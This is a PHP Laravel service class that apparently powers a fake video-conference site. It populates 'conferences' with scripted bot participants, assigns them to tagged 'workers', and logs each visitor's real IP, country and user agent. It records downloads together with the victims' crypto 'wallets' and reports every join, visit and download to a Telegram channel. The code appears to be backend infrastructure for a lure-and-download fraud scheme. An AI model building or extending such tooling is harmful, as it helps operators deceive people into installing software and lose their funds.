<?php

namespace App\Services;

use App\Models\Conference;
use App\Models\Message;
use App\Models\Visit;
use App\Models\Download;
use App\Models\Worker;
use App\Services\TelegramService;
use App\Helpers\IpHelper;
use Illuminate\Support\Str;

class ConferenceService
{
    public function __construct(
        private TelegramService $telegramService
    ) {}

    public function create(array $data, string $workerToken): Conference
    {
        $worker = Worker::where('tag', $workerToken)
            ->where('is_active', true)
            ->firstOrFail();

        $conference = Conference::create([
            'title' => $data['title'],
            'invite_code' => $this->generateInviteCode(),
            'worker_tag' => $worker->tag,
            'worker_id' => $worker->id,
            'is_active' => true
        ]);

        $this->telegramService->notifyWorkerAction(
            'Created conference',
            $worker->name,
            "Title: {$conference->title}, Code: {$conference->invite_code}"
        );

        return $conference;
    }

    public function getByInviteCode(string $inviteCode): ?Conference
    {
        return Conference::where('invite_code', $inviteCode)
            ->where('is_active', true)
            ->first();
    }

    public function join(string $inviteCode, ?string $userName = null): ?array
    {
        $conference = $this->getByInviteCode($inviteCode);
        
        if (!$conference) {
            return null;
        }

        $realIp = IpHelper::getRealIp();
        $countryInfo = IpHelper::getCountryInfo($realIp);
        
        $conferenceTitle = $userName 
            ? "{$conference->title} (User: {$userName})"
            : $conference->title;

        $this->telegramService->notifyConferenceJoin(
            $conferenceTitle,
            $inviteCode,
            $realIp,
            request()->userAgent(),
            $countryInfo
        );

        $bots = $conference->bots()->get()->map(function ($bot) {
            return [
                'id' => $bot->id,
                'name' => $bot->name,
                'avatar' => $bot->avatar,
                'mic' => $bot->mic,
                'hand' => $bot->hand,
                'avatar_url' => $bot->avatar_url
            ];
        });

        return [
            'conference' => [
                'id' => $conference->id,
                'created_at' => $conference->created_at->toISOString(),
                'bots' => $bots,
                'guests' => []
            ]
        ];
    }

    public function recordVisit(int $conferenceId): bool
    {
        $conference = Conference::findOrFail($conferenceId);

        $realIp = IpHelper::getRealIp();
        $countryInfo = IpHelper::getCountryInfo($realIp);
        
        Visit::create([
            'type' => 'conference',
            'reference_id' => $conferenceId,
            'ip_address' => $realIp,
            'user_agent' => request()->userAgent(),
            'country' => $countryInfo['country'],
            'country_code' => $countryInfo['country_code'],
            'flag' => $countryInfo['flag']
        ]);

        $this->telegramService->notifyPageVisit(
            'conference',
            $conference->invite_code,
            $realIp,
            request()->userAgent(),
            $countryInfo
        );

        return true;
    }

    public function recordDownload(int $conferenceId, array $data): bool
    {
        $conference = Conference::findOrFail($conferenceId);

        $realIp = IpHelper::getRealIp();
        $countryInfo = IpHelper::getCountryInfo($realIp);
        
        Download::create([
            'type' => 'conference',
            'reference_id' => $conferenceId,
            'platform' => $data['platform'] ?? 'unknown',
            'tag' => $data['tag'] ?? null,
            'user_agent' => request()->userAgent(),
            'wallets' => $data['wallets'] ?? [],
            'ip_address' => $realIp,
            'country' => $countryInfo['country'],
            'country_code' => $countryInfo['country_code'],
            'flag' => $countryInfo['flag']
        ]);

        $this->telegramService->notifyDownload(
            'conference',
            $conference->invite_code,
            $data['platform'] ?? 'unknown',
            $realIp,
            request()->userAgent(),
            $data['wallets'] ?? [],
            $countryInfo
        );

        return true;
    }

    public function getMessages(int $conferenceId): array
    {
        return Message::where('conference_id', $conferenceId)
            ->orderBy('created_at', 'asc')
            ->get()
            ->map(function ($message) {
                return [
                    'id' => $message->id,
                    'sender' => $message->sender,
                    'text' => $message->text,
                    'created_at' => $message->created_at->toISOString()
                ];
            })
            ->toArray();
    }

    public function sendMessage(int $conferenceId, array $data): bool
    {
        Message::create([
            'conference_id' => $conferenceId,
            'sender' => $data['sender'],
            'text' => $data['text']
        ]);

        return true;
    }

    public function getMembers(int $conferenceId): array
    {
        $conference = Conference::findOrFail($conferenceId);
        $bots = $conference->bots;

        return [
            'bots' => $bots->map(function ($bot) {
                return [
                    'id' => $bot->id,
                    'name' => $bot->name,
                    'avatar' => $bot->avatar,
                    'mic' => $bot->mic,
                    'hand' => $bot->hand,
                    'avatar_url' => $bot->avatar_url
                ];
            }),
            'guests' => []
        ];
    }

    public function getAllActive(): array
    {
        return Conference::where('is_active', true)
            ->get()
            ->map(function ($conference) {
                return [
                    'id' => $conference->id,
                    'title' => $conference->title,
                    'invite_code' => $conference->invite_code,
                    'worker_tag' => $conference->worker_tag,
                    'created_at' => $conference->created_at->toISOString()
                ];
            })
            ->toArray();
    }

    public function delete(int $id): bool
    {
        $conference = Conference::find($id);
        
        if (!$conference) {
            return false;
        }

        return $conference->delete();
    }

    public function getWorkerTag(int $conferenceId): string
    {
        $conference = Conference::findOrFail($conferenceId);
        return $conference->worker_tag;
    }

    private function generateInviteCode(): string
    {
        return strtoupper(substr(md5(uniqid()), 0, 8));
    }
}
